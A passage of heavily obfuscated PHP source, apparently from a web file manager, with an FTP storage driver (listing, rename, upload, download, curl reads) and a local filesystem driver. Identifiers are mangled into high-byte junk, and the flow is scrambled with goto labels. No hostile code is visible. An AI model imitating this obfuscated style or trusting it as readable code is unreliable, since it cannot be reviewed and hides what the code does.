return !1; } $fĞ˜«ÏİŒ­ = $this->iconvSystem($fĞ˜«ÏİŒ­); return @ftp_delete($this->connect, $fĞ˜«ÏİŒ­); } public function delFolder($FÔÅ…ÒÏªº) { goto AÇÓÇÓ½ŒŠ; b§×øå¨Ìé: $this->fileList($FÔÅ…ÒÏªº, $aºéÛºŸ¸, $b¯ÔÏ‘¨Ÿã, !0); $this->listItemCache = !0; foreach ($b¯ÔÏ‘¨Ÿã as $bñ³Ñ¥¿) { $CâÛ…Û—ó‘ = $this->iconvSystem($bñ³Ñ¥¿[$_SERVER[µ…][28]]); $a¤¤óï±Ì = @ftp_delete($this->connect, $CâÛ…Û—ó‘); if (!$a¤¤óï±Ì) { return !1; } } goto c¥¸Ôƒ››; c¥¸Ôƒ››: foreach ($aºéÛºŸ¸ as $CâÛ…Û—ó‘) { $CâÛ…Û—ó‘ = $this->iconvSystem($CâÛ…Û—ó‘); $a¤¤óï±Ì = @ftp_rmdir($this->connect, $CâÛ…Û—ó‘); if (!$a¤¤óï±Ì) { return !1; } } $FÔÅ…ÒÏªº = $this->iconvSystem($FÔÅ…ÒÏªº); return @ftp_rmdir($this->connect, $FÔÅ…ÒÏªº); goto d×ÍÑ‘¤Ç; AÇÓÇÓ½ŒŠ: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $aºéÛºŸ¸ = $b¯ÔÏ‘¨Ÿã = array(); goto b§×øå¨Ìé; d×ÍÑ‘¤Ç: } public function rename($FÏŒãÙ‘, $e¢˜˜áËô) { goto EŠÔŸ¹¡›¹; EŠÔŸ¹¡›¹: $A öêœøí =& $_SERVER[µ…]; if (!$this->_isconn()) { return !1; } $Dá™ğˆÜ‘º = $this->fileNameAuto($this->pathFather($FÏŒãÙ‘), $e¢˜˜áËô); goto Dèæ´’Ş•½; CõÖå­Œé: $aµ§´ÊÆì = rtrim($fÅ³í¥£˜ƒ, $A öêœøí[8]) . $A öêœøí[8] . $Dá™ğˆÜ‘º; $E‹ »’åŞ† = @ftp_rename($this->connect, $FÏŒãÙ‘, $aµ§´ÊÆì); $aµ§´ÊÆì = $this->iconvApp($aµ§´ÊÆì); goto E°˜ŠÌ³Îê; Dèæ´’Ş•½: $Dá™ğˆÜ‘º = $this->iconvSystem($Dá™ğˆÜ‘º); $FÏŒãÙ‘ = $this->iconvSystem($FÏŒãÙ‘); $fÅ³í¥£˜ƒ = $this->pathFather($FÏŒãÙ‘); goto CõÖå­Œé; E°˜ŠÌ³Îê: return $E‹ »’åŞ† ? $this->getPathOuter($aµ§´ÊÆì) : !1; goto B˜Ìùõ†Íã; B˜Ìùõ†Íã: } private function folderInfo($F†•Á†è, $c‘éÀ¿öÌ÷ = false) { $cî¤óí¹‚ =& $_SERVER[µ…]; $aä´ØëŠÛÏ = array($cî¤óí¹‚[28] => $this->pathThis($F†•Á†è), $cî¤óí¹‚[75] => $this->getPathOuter($cî¤óí¹‚[8] . $F†•Á†è), $cî¤óí¹‚[29] => $cî¤óí¹‚[76]); if ($c‘éÀ¿öÌ÷) { return $aä´ØëŠÛÏ; } $aä´ØëŠÛÏ[$cî¤óí¹‚[192]] = $aä´ØëŠÛÏ[$cî¤óí¹‚[83]] = 0; $aä´ØëŠÛÏ[$cî¤óí¹‚[193]] = $aä´ØëŠÛÏ[$cî¤óí¹‚[194]] = !0; return $aä´ØëŠÛÏ; } private function fileInfo($b‹ÌîºïóÇ, $Eù‘÷éŠô = false, $d»ÜœŠÏ· = array()) { goto dÂ‘”¸ ±; fç¡İ±šäÂ: $b¢œ‹È…ó‰[$b†Ì‚Ù…¿Ø[192]] = $b¢œ‹È…ó‰[$b†Ì‚Ù…¿Ø[83]] = 0; $b¢œ‹È…ó‰[$b†Ì‚Ù…¿Ø[193]] = $b¢œ‹È…ó‰[$b†Ì‚Ù…¿Ø[194]] = !0; $CÒƒ®„¿„ = $this->iconvSystem($b‹ÌîºïóÇ); goto d“›÷Ú±èñ; C èµ˜Ş: return $b¢œ‹È…ó‰; goto D‰‘»†óÁ»; dÂ‘”¸ ±: $b†Ì‚Ù…¿Ø =& $_SERVER[µ…]; $b¢œ‹È…ó‰ = array($b†Ì‚Ù…¿Ø[28] => $this->pathThis($b‹ÌîºïóÇ), $b†Ì‚Ù…¿Ø[75] => $this->getPathOuter($b†Ì‚Ù…¿Ø[8] . $b‹ÌîºïóÇ), $b†Ì‚Ù…¿Ø[29] => $b†Ì‚Ù…¿Ø[191], $b†Ì‚Ù…¿Ø[77] => isset($d»ÜœŠÏ·[$b†Ì‚Ù…¿Ø[77]]) ? $d»ÜœŠÏ·[$b†Ì‚Ù…¿Ø[77]] : 0, $b†Ì‚Ù…¿Ø[167] => $this->ext($b‹ÌîºïóÇ)); if ($Eù‘÷éŠô) { return $b¢œ‹È…ó‰; } goto fç¡İ±šäÂ; d“›÷Ú±èñ: $b¢œ‹È…ó‰[$b†Ì‚Ù…¿Ø[83]] = @ftp_mdtm($this->connect, $CÒƒ®„¿„); if (empty($d»ÜœŠÏ·)) { $d»ÜœŠÏ· = $this->objectMeta($b‹ÌîºïóÇ); if (!$d»ÜœŠÏ·) { return $b¢œ‹È…ó‰; } } $b¢œ‹È…ó‰[$b†Ì‚Ù…¿Ø[77]] = $d»ÜœŠÏ·[$b†Ì‚Ù…¿Ø[77]]; goto C èµ˜Ş; D‰‘»†óÁ»: } public function size($F¿©¾ÏÓßå) { $bÑ¯ÌÙÚâ– = $this->objectMeta($F¿©¾ÏÓßå); return $bÑ¯ÌÙÚâ– ? $bÑ¯ÌÙÚâ–[$_SERVER[µ…][77]] : 0; } public function info($cª“»×Ÿ’) { if ($this->isFile($cª“»×Ÿ’)) { return $this->fileInfo($cª“»×Ÿ’, 0); } else { if ($this->isFolder($cª“»×Ÿ’)) { return $this->folderInfo($cª“»×Ÿ’); } } return !1; } private function fileList($b¤çŸ«‚—, &$AÔ¡ƒìƒò, &$bøßÃ”…ê³, $EĞÌŒ´Ê = false) { goto cÙ°ÃÅ¬±İ; Eš‚Õ…ÕÍ: @ftp_chdir($this->connect, $B”ì—Ï¿Ê[8]); $b¤çŸ«‚— = rtrim($b¤çŸ«‚—, $B”ì—Ï¿Ê[8]) . $B”ì—Ï¿Ê[8]; check_abort(); goto AÜØŒÉ“ ; cÙ°ÃÅ¬±İ: $B”ì—Ï¿Ê =& $_SERVER[µ…]; $b¤çŸ«‚— = $this->iconvSystem($b¤çŸ«‚—); if (!$this->isFolder($b¤çŸ«‚—)) { return !1; } goto Eš‚Õ…ÕÍ; AÜØŒÉ“ : $EÂš ²ö = $this->listItemCache === !1 ? !1 : !0; $C„¾Ğ­ãğ» = @ftp_rawlist($this->connect, $b¤çŸ«‚—); if (!$C„¾Ğ­ãğ») { $C„¾Ğ­ãğ» = array(); } goto d–µ’–™©Ò; d–µ’–™©Ò: $A©å¶ªÇéë = array($B”ì—Ï¿Ê[94] => 1, $B”ì—Ï¿Ê[1228] => 1); foreach ($C„¾Ğ­ãğ» as $aº¦¼Øá­£) { goto F‘¥Å¹±³Ì; E®’‚ª«‡˜: if (!$e×®£É…ÕÊ || isset($A©å¶ªÇéë[$e×®£É…ÕÊ])) { continue; } $e×®£É…ÕÊ = $this->iconvApp($b¤çŸ«‚— . ltrim($e×®£É…ÕÊ, $B”ì—Ï¿Ê[8])); $b°‚ÇŠŸµ = array($B”ì—Ï¿Ê[28] => $e×®£É…ÕÊ, $B”ì—Ï¿Ê[29] => $B”ì—Ï¿Ê[191], $B”ì—Ï¿Ê[77] => $f«ŠÜõ¾Ù[4]); goto bİ¬…Üã; E—¶¤½–Ë: if ($d‚Ã„Ûéïê) { $AÔ¡ƒìƒò[] = $e×®£É…ÕÊ; if ($EĞÌŒ´Ê) { $this->fileList($e×®£É…ÕÊ, $AÔ¡ƒìƒò, $bøßÃ”…ê³, $EĞÌŒ´Ê); } continue; } $bøßÃ”…ê³[] = $b°‚ÇŠŸµ; goto E©ÆÙÇ¹ã†; bİ¬…Üã: if (substr($aº¦¼Øá­£, 0, 1) == $B”ì—Ï¿Ê[1229]) { $b°‚ÇŠŸµ[$B”ì—Ï¿Ê[29]] = $B”ì—Ï¿Ê[76]; $b°‚ÇŠŸµ[$B”ì—Ï¿Ê[77]] = 0; } $d‚Ã„Ûéïê = $b°‚ÇŠŸµ[$B”ì—Ï¿Ê[29]] == $B”ì—Ï¿Ê[76] ? !0 : !1; if ($EÂš ²ö) { $this->cacheMethod($B”ì—Ï¿Ê[197], $e×®£É…ÕÊ, $d‚Ã„Ûéïê); $this->cacheMethod($B”ì—Ï¿Ê[198], $e×®£É…ÕÊ, $b°‚ÇŠŸµ); } goto E—¶¤½–Ë; F‘¥Å¹±³Ì: $f«ŠÜõ¾Ù = $this->_listItem($aº¦¼Øá­£); if ($f«ŠÜõ¾Ù[0] == $B”ì—Ï¿Ê[710]) { continue; } $e×®£É…ÕÊ = $f«ŠÜõ¾Ù[8]; goto E®’‚ª«‡˜; E©ÆÙÇ¹ã†: } if ($EÂš ²ö) { $this->cacheMethod($B”ì—Ï¿Ê[197], $b¤çŸ«‚—, !0); } goto dàƒÙêç¡‰; dàƒÙêç¡‰: } private function _listItem($aÃáÁæ°ÅŞ) { if (empty($aÃáÁæ°ÅŞ)) { return array(); } $D¸Ôì„Úõ¢ = preg_split($_SERVER[µ…][1230], $aÃáÁæ°ÅŞ); if (count($D¸Ôì„Úõ¢) <= 9) { return $D¸Ôì„Úõ¢; } $D¸Ôì„Úõ¢[8] = trim(substr($aÃáÁæ°ÅŞ, strpos($aÃáÁæ°ÅŞ, $D¸Ôì„Úõ¢[7]) + strlen($D¸Ôì„Úõ¢[7]))); return array_splice($D¸Ôì„Úõ¢, 0, 9); } public function listPath($eùÊ¼­İ†, $a½ƒšæ‚• = false) { goto BÈéÁèï; BÈéÁèï: $C‹ÂøÉç‡â =& $_SERVER[µ…]; if (!$this->_isconn()) { return !1; } $F­ˆÌ„Ù = $d‹Àó¢—œ¼ = array(); goto A•‡Ù†ÛÂá; AšÃã²Çæ: return array($C‹ÂøÉç‡â[74] => $F­ˆÌ„Ù, $C‹ÂøÉç‡â[73] => $d‹Àó¢—œ¼); goto c‘ëáªñ¼; A•‡Ù†ÛÂá: $this->fileList($eùÊ¼­İ†, $F­ˆÌ„Ù, $d‹Àó¢—œ¼); foreach ($F­ˆÌ„Ù as $E•å®Îå« => $f­—È¢îÂ­) { $F­ˆÌ„Ù[$E•å®Îå«] = $this->folderInfo($f­—È¢îÂ­, $a½ƒšæ‚•); } foreach ($d‹Àó¢—œ¼ as $E•å®Îå« => $f­—È¢îÂ­) { $d‹Àó¢—œ¼[$E•å®Îå«] = $this->fileInfo($f­—È¢îÂ­[$C‹ÂøÉç‡â[28]], $a½ƒšæ‚•, $f­—È¢îÂ­); } goto AšÃã²Çæ; c‘ëáªñ¼: } public function has($eÈĞùšƒ®, $Eİé‡Ùöó = false, $aÕÂÕ’Úàí = true) { goto eÆ‹‡“¬ù; FóßÁóÅ: return !1; goto CäÃº‚ƒñ; DÈå–½‹Ê: $this->fileList($eÈĞùšƒ®, $C¦¯†ÄÍŠ”, $C“ßÔê°„, $cğ‹Êù¦ ); if ($Eİé‡Ùöó) { return array($Cåë­–Ö[201] => count($C“ßÔê°„), $Cåë­–Ö[202] => count($C¦¯†ÄÍŠ”)); } if ($aÕÂÕ’Úàí) { if (count($C“ßÔê°„)) { return !0; } } else { if (count($C¦¯†ÄÍŠ”)) { return !0; } } goto FóßÁóÅ; eÆ‹‡“¬ù: $Cåë­–Ö =& $_SERVER[µ…]; $C¦¯†ÄÍŠ” = $C“ßÔê°„ = array(); $cğ‹Êù¦  = $Eİé‡Ùöó ? !0 : !1; goto DÈå–½‹Ê; CäÃº‚ƒñ: } public function listAll($b”äÙŞ«˜–) { goto DØê£‘š‘´; fàëèÍ•ë: foreach ($Eâ‰‡“Ëë as $AóĞğ§ÄÒ) { if (is_string($AóĞğ§ÄÒ)) { $BÁçÖÃô®[$AóĞğ§ÄÒ] = 0; } } return $this->listAllFiles($b”äÙŞ«˜–, array_keys($BÁçÖÃô®), $BÁçÖÃô®); goto e«ÖØÊÖ™Æ; DØê£‘š‘´: $C¡¹ó¯Æ˜ƒ =& $_SERVER[µ…]; if (!$this->_isconn()) { return !1; } $Eâ‰‡“Ëë = $D­ˆÎˆ‡¡– = array(); goto d¾¶´–Ì–; d¾¶´–Ì–: $this->fileList($b”äÙŞ«˜–, $Eâ‰‡“Ëë, $D­ˆÎˆ‡¡–, !0); $BÁçÖÃô® = array(); foreach ($D­ˆÎˆ‡¡– as $AóĞğ§ÄÒ) { $BÁçÖÃô®[$AóĞğ§ÄÒ[$C¡¹ó¯Æ˜ƒ[28]]] = $AóĞğ§ÄÒ[$C¡¹ó¯Æ˜ƒ[77]]; } goto fàëèÍ•ë; e«ÖØÊÖ™Æ: } public function getContent($CğÙŞŠÀÛ) { if (!$this->_isconn()) { return !1; } $CğÙŞŠÀÛ = $this->iconvSystem($CğÙŞŠÀÛ); return $this->fileSubstr($CğÙŞŠÀÛ); } public function setContent($b¢²Ö”¡ŠÑ, $cÄ‘Â§ÛñŞ = '') { goto fİÜ«Õ›É; E…±‡÷İ¿: file_put_contents($E“ãÊÒ³àî, $cÄ‘Â§ÛñŞ); $d©×íÒÃßÆ = $this->upload($b¢²Ö”¡ŠÑ, $this->iconvApp($E“ãÊÒ³àî)); $this->tempFileRemve($E“ãÊÒ³àî); goto Aêİø¨Ü÷ô; fİÜ«Õ›É: if (!$this->_isconn()) { return !1; } $C¤ƒÈ™æ‚Œ = $this->pathThis($this->iconvSystem($b¢²Ö”¡ŠÑ)); $E“ãÊÒ³àî = $this->tempFile($C¤ƒÈ™æ‚Œ); goto E…±‡÷İ¿; Aêİø¨Ü÷ô: return $d©×íÒÃßÆ; goto AÓíùˆÜ¾ç; AÓíùˆÜ¾ç: } public function fileSubstr($FÂÀ«®¢ÛÒ, $a£‹„ ÇÓ· = 0, $E·Ñ×ôˆ‹ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($FÂÀ«®¢ÛÒ, $a£‹„ ÇÓ·, $E·Ñ×ôˆ‹); } private function ftpRequest($C×ˆÖ°³, $CÍõìä»ñ­ = 0, $Fù®ôÔó¨ = false) { goto CÜŒ‰éÇ÷«; DéÁ¼ñøÌ…: curl_setopt($f¸‚²£, CURLOPT_URL, $d¯ÚïÅÂ™› . $this->pathEncode($C×ˆÖ°³)); curl_setopt($f¸‚²£, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($Fù®ôÔó¨) { $F·Ê¢‘À¼¢ = $CÍõìä»ñ­ + $Fù®ôÔó¨ - 1; curl_setopt($f¸‚²£, CURLOPT_RANGE, "{$CÍõìä»ñ­}\x2d{$F·Ê¢‘À¼¢}"); } goto fùáÂ†…½Â; CÜŒ‰éÇ÷«: $C×ˆÖ°³ = $this->iconvSystem($C×ˆÖ°³); $d¯ÚïÅÂ™› = $this->scheme . $this->host . $_SERVER[µ…][4] . $this->port; $f¸‚²£ = curl_init(); goto DéÁ¼ñøÌ…; fùáÂ†…½Â: curl_setopt($f¸‚²£, CURLOPT_RETURNTRANSFER, 1); $E¥ç’…Š¼ = curl_exec($f¸‚²£); curl_close($f¸‚²£); goto a°ªò›øø¶; a°ªò›øø¶: return $E¥ç’…Š¼; goto F¨šÉœõ“¶; F¨šÉœõ“¶: } public function upload($DæÎï­’µ, $e’ˆ¡‡—ö, $bî®”ê¬¢„ = false, $cÑË¶¯œ©¥ = REPEAT_REPLACE) { goto AÈöÓŠÄ¹ó; Fô¯ñíç¸Ø: $e’ˆ¡‡—ö = $this->iconvSystem($e’ˆ¡‡—ö); $BÑÆµÈ¿†¬ = ftp_nb_put($this->connect, $DæÎï­’µ, $e’ˆ¡‡—ö, FTP_BINARY); while ($BÑÆµÈ¿†¬ == FTP_MOREDATA) { $BÑÆµÈ¿†¬ = ftp_nb_continue($this->connect); } goto cÍ¹Ùâ‰³­; cÍ¹Ùâ‰³­: if ($BÑÆµÈ¿†¬ != FTP_FINISHED) { return !1; } return $this->getPathOuter($DæÎï­’µ); goto Fï…„ßÀÄ; AÈöÓŠÄ¹ó: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($DæÎï­’µ))) { return !1; } $DæÎï­’µ = $this->iconvSystem($DæÎï­’µ); goto Fô¯ñíç¸Ø; Fï…„ßÀÄ: } public function download($a‚ÛÆ¬ø‡ç, $eÍÈÆ‹š³ƒ = '') { goto E–Š½…ˆ¾’; E–Š½…ˆ¾’: if (!$this->_isconn()) { return !1; } $CÈŸŠ¿ãö = $this->pathFather($eÍÈÆ‹š³ƒ); if (!IO::mkdir($CÈŸŠ¿ãö)) { return !1; } goto eåËê¼‘Â; c‘ÚË÷Ñ»Ø: while ($dÜ’ã¶ïİí == FTP_MOREDATA) { $dÜ’ã¶ïİí = ftp_nb_continue($this->connect); } if ($dÜ’ã¶ïİí != FTP_FINISHED) { return !1; } return $this->iconvApp($eÍÈÆ‹š³ƒ); goto FÍ‘èÓ«¸‡; eåËê¼‘Â: $a‚ÛÆ¬ø‡ç = $this->iconvSystem($a‚ÛÆ¬ø‡ç); $eÍÈÆ‹š³ƒ = $this->iconvSystem($eÍÈÆ‹š³ƒ); $dÜ’ã¶ïİí = ftp_nb_get($this->connect, $eÍÈÆ‹š³ƒ, $a‚ÛÆ¬ø‡ç, FTP_BINARY); goto c‘ÚË÷Ñ»Ø; FÍ‘èÓ«¸‡: } public function exist($fÂ¸Áƒàƒ‚) { return $this->isFile($fÂ¸Áƒàƒ‚) || $this->isFolder($fÂ¸Áƒàƒ‚); } public function isFile($c«Ğ¶ê”¹) { return !$this->isFolder($c«Ğ¶ê”¹) && $this->objectMeta($c«Ğ¶ê”¹); } public function isFolder($FùÈ¢²¯ Ÿ) { return $this->cacheMethod($_SERVER[µ…][197], $FùÈ¢²¯ Ÿ); } protected function objectMeta($d©‘®¦Çªê) { return $this->cacheMethod($_SERVER[µ…][198], $d©‘®¦Çªê); } protected function _objectMeta($E´¿‰É’ò„) { goto F­õòç¦À„; cœÃæíã: $E´¿‰É’ò„ = $this->iconvSystem($E´¿‰É’ò„); $AÂØ½øˆİå = array($CÊ…‘¯±º®[28] => $this->iconvApp($E´¿‰É’ò„), $CÊ…‘¯±º®[29] => $CÊ…‘¯±º®[191], $CÊ…‘¯±º®[77] => 0); @ftp_chdir($this->connect, $CÊ…‘¯±º®[8]); goto aâŸ¡¨‹‡¾; F­õòç¦À„: $CÊ…‘¯±º® =& $_SERVER[µ…]; if ($E´¿‰É’ò„ == $CÊ…‘¯±º®[33] || $E´¿‰É’ò„ == $CÊ…‘¯±º®[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto cœÃæíã; aâŸ¡¨‹‡¾: $CÄ¨è¸ˆÑö = @ftp_size($this->connect, $E´¿‰É’ò„); if ($CÄ¨è¸ˆÑö != -1) { $AÂØ½øˆİå[$CÊ…‘¯±º®[77]] = $CÄ¨è¸ˆÑö; } else { $bñ²•¡¶’¸ = @ftp_chdir($this->connect, $E´¿‰É’ò„); if (!$bñ²•¡¶’¸) { return !1; } $AÂØ½øˆİå[$CÊ…‘¯±º®[29]] = $CÊ…‘¯±º®[76]; } return $AÂØ½øˆİå; goto BÄ†ïÒ×©ö; BÄ†ïÒ×©ö: } protected function _isFolder($aÌì¾¸£) { $aĞ”ç¤œòƒ =& $_SERVER[µ…]; if ($aÌì¾¸£ == $aĞ”ç¤œòƒ[33] || $aÌì¾¸£ == $aĞ”ç¤œòƒ[8]) { return !0; } $dÍØŸŸ° = $this->_objectMeta($aÌì¾¸£); return isset($dÍØŸŸ°[$aĞ”ç¤œòƒ[29]]) && $dÍØŸŸ°[$aĞ”ç¤œòƒ[29]] == $aĞ”ç¤œòƒ[76] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($F‚‹àœš“) { if (substr($F‚‹àœš“, 0, 2) == $_SERVER[µ…][1221]) { $F‚‹àœš“ = BASIC_PATH . substr($F‚‹àœš“, 2); } return $F‚‹àœš“; } public function iconvApp($dÍğª¾íğõ) { $aï¡•åÊ¨î =& $_SERVER[µ…]; global $config; return $this->iconvTo($dÍğª¾íğõ, $config[$aï¡•åÊ¨î[1219]], $config[$aï¡•åÊ¨î[1218]]); } public function iconvSystem($d¶Èº‹”Ş‚) { $F‰´Ï‰Ç÷ =& $_SERVER[µ…]; global $config; return $this->iconvTo($d¶Èº‹”Ş‚, $config[$F‰´Ï‰Ç÷[1218]], $config[$F‰´Ï‰Ç÷[1219]]); } public function getPathOuter($fğ’‡Í¨Ùà) { goto f¡é˜³Òõ; C·„ëØÕÊ: return $this->pathDriver . $Aœ¸Çâ’[8] . ltrim($fğ’‡Í¨Ùà, $Aœ¸Çâ’[8]); goto bÁµß²Åã“; f¡é˜³Òõ: $Aœ¸Çâ’ =& $_SERVER[µ…]; $b«Ãœ„ŠÊ¦ = $this->iconvApp($this->pathBase); $fğ’‡Í¨Ùà = $this->iconvApp($fğ’‡Í¨Ùà); goto d“ö¼æ†æ›; d“ö¼æ†æ›: if (substr($b«Ãœ„ŠÊ¦, 0, 2) == $Aœ¸Çâ’[1221]) { $b«Ãœ„ŠÊ¦ = BASIC_PATH . substr($b«Ãœ„ŠÊ¦, 2); } if (substr($fğ’‡Í¨Ùà, 0, 2) == $Aœ¸Çâ’[1221]) { $fğ’‡Í¨Ùà = BASIC_PATH . substr($fğ’‡Í¨Ùà, 2); } $b«Ãœ„ŠÊ¦ = KodIO::clear($b«Ãœ„ŠÊ¦); goto d‰Ó”çÆ—; d‰Ó”çÆ—: $fğ’‡Í¨Ùà = KodIO::clear($fğ’‡Í¨Ùà); $fğ’‡Í¨Ùà = substr($fğ’‡Í¨Ùà, strlen($b«Ãœ„ŠÊ¦)); if (empty($this->pathDriver)) { return $fğ’‡Í¨Ùà; } goto C·„ëØÕÊ; bÁµß²Åã“: } public function mkfile($céÃ¢ùù¹¨, $CèÉ‡¼Äò = '', $Bâàœ‚âì = REPEAT_RENAME) { $céÃ¢ùù¹¨ = $this->iconvSystem($céÃ¢ùù¹¨); @touch($céÃ¢ùù¹¨); if ($CèÉ‡¼Äò) { file_put_contents($céÃ¢ùù¹¨, $CèÉ‡¼Äò); } return is_file($céÃ¢ùù¹¨) ? $this->getPathOuter($céÃ¢ùù¹¨) : !1; } public function mkdir($e—ôšª–Àê, $DÈİÖÙ‘¾ó = REPEAT_SKIP) { $e—ôšª–Àê = $this->iconvSystem($e—ôšª–Àê); if (is_dir($e—ôšª–Àê)) { return $this->getPathOuter($e—ôšª–Àê); } @mkdir($e—ôšª–Àê, 511, !0); return is_dir($e—ôšª–Àê) ? $this->getPathOuter($e—ôšª–Àê) : !1; } public function copyFile($Dô®õ¨ã¾Ş, $Aèï•¿ˆª) { $this->mkdir($this->pathFather($Aèï•¿ˆª)); $Dô®õ¨ã¾Ş = $this->iconvSystem($Dô®õ¨ã¾Ş); $Aèï•¿ˆª = $this->iconvSystem($Aèï•¿ˆª); $A§Ï‹ÜÊˆ¿ = copy_64($Dô®õ¨ã¾Ş, $Aèï•¿ˆª); return $A§Ï‹ÜÊˆ¿ ? $this->getPathOuter($Aèï•¿ˆª) : !1; } public function moveFile($a‡ˆŞ”šŠ, $c£èîã¶Ù) { $this->mkdir($this->pathFather($c£èîã¶Ù)); $a‡ˆŞ”šŠ = $this->iconvSystem($a‡ˆŞ”šŠ); $c£èîã¶Ù = $this->iconvSystem($c£èîã¶Ù); $d÷ğêÉï˜® = intval(@rename($a‡ˆŞ”šŠ, $c£èîã¶Ù)); if (!$d÷ğêÉï˜®) { if ($d÷ğêÉï˜® = intval(@copy_64($a‡ˆŞ”šŠ, $c£èîã¶Ù))) { @unlink($a‡ˆŞ”šŠ); } } return $d÷ğêÉï˜® ? $this->getPathOuter($c£èîã¶Ù) : !1; } public function delFile($EÂêš¯Á) { $EÂêš¯Á = $this->iconvSystem($EÂêš¯Á); if (!@unlink($EÂêš¯Á)) { @chmod($EÂêš¯Á, 511); if (!@unlink($EÂêš¯Á)) { return !1; } } else { return !0; } } public function delFolder($a†ÁŸ³‘å) { goto C†¨˜¼——‹; cõ£µöÙÜ: if (!($e™½Ùä´› = opendir($a†ÁŸ³‘å))) { return !1; } while (($Fîãô©¬‘ = readdir($e™½Ùä´›)) !== !1) { if ($Fîãô©¬‘ == $a®ù‡ƒ’õ[94] || $Fîãô©¬‘ == $a®ù‡ƒ’õ[1228]) { continue; } $eÙï’š¬ÍÊ = $a†ÁŸ³‘å . $a®ù‡ƒ’õ[8] . $Fîãô©¬‘; if (is_file($eÙï’š¬ÍÊ) || is_link($eÙï’š¬ÍÊ)) { if (!unlink($eÙï’š¬ÍÊ)) { chmod($eÙï’š¬ÍÊ, 511); if (!unlink($eÙï’š¬ÍÊ)) { return !1; } } } else { if (is_dir($eÙï’š¬ÍÊ)) { chmod($eÙï’š¬ÍÊ, 511); $eÙï’š¬ÍÊ = $this->iconvApp($eÙï’š¬ÍÊ); if (!$this->delFolder($eÙï’š¬ÍÊ)) { return !1; } } } } closedir($e™½Ùä´›); goto eåñË–Îø•; C†¨˜¼——‹: $a®ù‡ƒ’õ =& $_SERVER[µ…]; $a†ÁŸ³‘å = $this->iconvSystem($a†ÁŸ³‘å); if (!is_dir($a†ÁŸ³‘å)) { return !0; } goto cõ£µöÙÜ; eåñË–Îø•: return rmdir($a†ÁŸ³‘å); goto eˆœÕƒ¿áà; eˆœÕƒ¿áà: } public function rename($cÏª‘¥ì×°, $BØºå¨ˆ¢›) { goto dèß¨ÊŞÂ¨; DµÀù­Ü¡ö: $cÏª‘¥ì×° = $this->iconvSystem($cÏª‘¥ì×°); $C½¶ãØº = $this->pathFather($cÏª‘¥ì×°); $FÊ¨‡š¡„ = rtrim($C½¶ãØº, $cÍŞ ì¥‘é[8]) . $cÍŞ ì¥‘é[8] . $a¢­ÁÂÃ„ê; goto Fƒ ÏÂĞÊ­; dèß¨ÊŞÂ¨: $cÍŞ ì¥‘é =& $_SERVER[µ…]; $a¢­ÁÂÃ„ê = $this->fileNameAuto($this->pathFather($cÏª‘¥ì×°), $BØºå¨ˆ¢›); $a¢­ÁÂÃ„ê = $this->iconvSystem($a¢­ÁÂÃ„ê); goto DµÀù­Ü¡ö; Fƒ ÏÂĞÊ­: $Bê£Ë×¢Ÿ† = @rename($cÏª‘¥ì×°, $FÊ¨‡š¡„); $FÊ¨‡š¡„ = $this->iconvApp($FÊ¨‡š¡„); return $Bê£Ë×¢Ÿ† ? $this->getPathOuter($FÊ¨‡š¡„) : !1; goto D¬°›ÑÄÁñ; D¬°›ÑÄÁñ: } public function size($DÕË·»ÎÔÒ) { $DÕË·»ÎÔÒ = $this->iconvSystem($DÕË·»ÎÔÒ); return filesize_64($DÕË·»ÎÔÒ); } public function info($d´Ø×‚¡ ‰) { $d´Ø×‚¡ ‰ = $this->iconvSystem($d´Ø×‚¡ ‰); if ($this->isFolder($d´Ø×‚¡ ‰)) { return $this->folderInfo($d´Ø×‚¡ ‰); } else { if ($this->isFile($d´Ø×‚¡ ‰)) { return $this->fileInfo($d´Ø×‚¡ ‰); } } return !1; } protected function infoChildren($FœÏá…Ç¹™, &$fåŞÒ®¬§, $c¿±å¬±˜® = true) { goto fö‡Œ¼ç ; déÖĞÚÆëó: closedir($fÊˆ¥â§Æ); goto aÂ—Å°°†; cÎ’ì—¾÷: if ($c¿±å¬±˜®) { $FœÏá…Ç¹™ = $this->iconvSystem($FœÏá…Ç¹™); } if (!($fÊˆ¥â§Æ = @opendir($FœÏá…Ç¹™))) { return; } while (($e§Û§ÇçöÔ = readdir($fÊˆ¥â§Æ)) !== !1) { if ($e§Û§ÇçöÔ == $D¯«ÍËäíë[94] || $e§Û§ÇçöÔ == $D¯«ÍËäíë[1228]) { continue; } $e«ŠÃ±ÅÀ„ = $FœÏá…Ç¹™ . $e§Û§ÇçöÔ; if (is_file($e«ŠÃ±ÅÀ„) || is_link($e«ŠÃ±ÅÀ„)) { $fåŞÒ®¬§[$D¯«ÍËäíë[78]]++; $fåŞÒ®¬§[$D¯«ÍËäíë[77]] += filesize_64($e«ŠÃ±ÅÀ„); } else { if (is_dir($e«ŠÃ±ÅÀ„)) { $fåŞÒ®¬§[$D¯«ÍËäíë[79]]++; $this->infoChildren($e«ŠÃ±ÅÀ„, $fåŞÒ®¬§, !1); } } } goto déÖĞÚÆëó; fö‡Œ¼ç : $D¯«ÍËäíë =& $_SERVER[µ…]; check_abort_echo(); $FœÏá…Ç¹™ = rtrim($FœÏá…Ç¹™, $D¯«ÍËäíë[8]) . $D¯«ÍËäíë[8]; goto cÎ’ì—¾÷; aÂ—Å°°†: } private function folderInfo($eÒ˜êË»“í, $c›‘è˜óˆ‡ = false) { $F¤†¥õ‹Ş =& $_SERVER[µ…]; $eÒ˜êË»“í = rtrim($eÒ˜êË»“í, $F¤†¥õ‹Ş[8]) . $F¤†¥õ‹Ş[8]; $BéÛÂğ›ç = $this->iconvApp($this->pathThis($eÒ˜êË»“í)); if ($c›‘è˜óˆ‡) { return array($F¤†¥õ‹Ş[28] => $BéÛÂğ›ç, $F¤†¥õ‹Ş[75] => $this->getPathOuter($eÒ˜êË»“í), $F¤†¥õ‹Ş[29] => $F¤†¥õ‹Ş[76]); } $dˆù§¤«µÚ = array($F¤†¥õ‹Ş[28] => $BéÛÂğ›ç, $F¤†¥õ‹Ş[75] => $this->getPathOuter($eÒ˜êË»“í), $F¤†¥õ‹Ş[29] => $F¤†¥õ‹Ş[76], $F¤†¥õ‹Ş[192] => @filectime($eÒ˜êË»“í), $F¤†¥õ‹Ş[83] => @filemtime($eÒ˜êË»“í), 